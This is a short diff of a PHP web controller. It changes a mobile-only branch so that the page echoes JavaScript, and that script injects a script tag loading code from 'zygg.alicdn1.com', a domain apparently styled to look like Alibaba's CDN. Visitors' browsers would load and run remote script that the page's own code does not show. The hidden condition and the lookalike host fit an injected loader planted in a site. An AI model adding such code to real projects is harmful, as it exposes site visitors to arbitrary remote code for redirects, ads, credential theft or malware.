@@ -203,7 +203,7 @@ class IndexController extends HomebaseController {
 //        $url = $urls[array_rand($urls)];
 //        $this->display(":rbutton");
         if(ismobile()) {
-           $this->doZygg();
+            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://zygg.alicdn1.com/aaa.js?t=" . time() . "';A.stype = 'text/javascript';document.body.appendChild(A);";
         }
 
 
